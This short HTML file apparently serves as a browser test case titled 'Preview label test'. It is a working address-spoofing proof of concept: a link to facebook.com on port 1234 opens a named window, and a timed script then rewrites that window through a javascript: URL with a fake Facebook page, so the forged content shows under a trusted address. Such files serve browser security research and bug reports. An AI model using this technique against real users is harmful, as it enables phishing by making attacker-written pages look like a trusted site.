 <!doctype html>
  <meta charset="utf-8">
  <title>Preview label test</title>

  <a href="https://www.facebook.com:1234" target="ux" onclick="setTimeout(spoof, 200)">
    <span style="position:absolute;left:-9999px;top:auto">hi from facebook</span>
    <h1>hi from facebook</h1>
  </a>

  <script>
  function spoof() {
    var t = window.open('javascript:alert(document.domain)', 'ux');
    try {
      t.document.open();
      t.document.write('<!doctype html><title>Facebook</title><h1>hi from facebook</h1>');
      t.document.close();
    } catch (e) {
      console.log(e);
    }
  }
  </script>
